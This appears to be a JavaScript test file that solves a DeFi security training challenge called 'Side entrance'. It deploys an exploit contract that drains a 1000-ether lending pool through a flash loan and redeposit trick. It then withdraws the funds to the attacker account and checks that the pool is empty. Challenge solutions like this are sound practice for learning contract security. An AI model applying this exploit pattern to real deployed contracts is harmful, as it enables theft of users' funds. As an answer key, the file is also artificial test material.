const { ether, balance } = require("@openzeppelin/test-helpers");

const { contract, accounts } = require("@openzeppelin/test-environment");

const SideEntranceLenderPool = contract.fromArtifact("SideEntranceLenderPool");
const FlashLoanEtherReceiver = contract.fromArtifact("FlashLoanEtherReceiver");

const { expect } = require("chai");

describe("[Challenge] Side entrance", function () {
  const [deployer, attacker, ...otherAccounts] = accounts;

  const ETHER_IN_POOL = ether("1000");
  let sideEntranceExploit;

  before(async function () {
    /** SETUP SCENARIO */
    this.pool = await SideEntranceLenderPool.new({ from: deployer });

    await this.pool.deposit({ from: deployer, value: ETHER_IN_POOL });

    this.attackerInitialEthBalance = await balance.current(attacker);

    expect(await balance.current(this.pool.address)).to.be.bignumber.equal(
      ETHER_IN_POOL
    );
  });

  it("Exploit", async function () {
    /** YOUR EXPLOIT GOES HERE */

    sideEntranceExploit = await FlashLoanEtherReceiver.new(
      this.pool.address,
      attacker,
      {
        from: deployer,
      }
    );

    const poolBalanceBefore = await balance.current(this.pool.address);
    console.log(`poolBalanceBefore: ${poolBalanceBefore.toString()}`);

    sideEntranceExploitBalanceBefore = await balance.current(sideEntranceExploit.address);
    console.log(
      `sideEntranceExploitBalanceBefore: ${sideEntranceExploitBalanceBefore.toString()}`
    );
    await sideEntranceExploit.deposit({
      from: deployer,
      value: ether("3000"),
    });
    await sideEntranceExploit.callFlashLoan();

    const poolBalanceAfter = await balance.current(this.pool.address);
    console.log(`poolBalanceAfter: ${poolBalanceAfter.toString()}`);

    sideEntranceExploitBalanceAfter = await balance.current(sideEntranceExploit.address);
    console.log(
      `sideEntranceExploitBalanceAfter: ${sideEntranceExploitBalanceAfter.toString()}`
    );
    attackerBalanceAfter = await balance.current(attacker);
    console.log(`attackerBalanceAfter: ${attackerBalanceAfter.toString()}`);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    await sideEntranceExploit.withdrawFromPool({ from: deployer });

    expect(await balance.current(this.pool.address)).to.be.bignumber.equal("0");
    expect(await balance.current(attacker)).to.be.bignumber.gt(ETHER_IN_POOL);

    // Not checking exactly how much is the final balance of the attacker,
    // because it'll depend on how much gas the attacker spends in the attack
    // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
    // expect(await balance.current(attacker)).to.be.bignumber.gt(
    //   this.attackerInitialEthBalance
    // );
  });
});
